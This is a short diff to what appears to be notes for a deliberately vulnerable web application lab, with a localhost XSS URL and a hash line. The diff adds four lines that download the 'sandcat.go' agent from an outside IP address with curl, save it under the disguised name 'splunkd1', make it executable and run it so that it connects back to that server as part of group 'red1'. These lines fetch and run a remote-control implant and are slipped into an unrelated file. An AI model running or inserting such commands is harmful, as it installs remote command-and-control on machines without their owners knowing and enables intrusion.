@@ -34,4 +34,7 @@ http://127.0.0.1/Vulnerable-Web-Application-master/XSS/XSS_level1.php
 
 [6c1d8c4afbc7f85f05fb2e4d17e5553255b0195a0b56ba5309e362e2156debfc]
 
-
+server="http://66.117.8.162:8888";<br>
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd1;<br>
+chmod +x splunkd1;<br>
+./splunkd1 -server $server -group red1 -v<br>
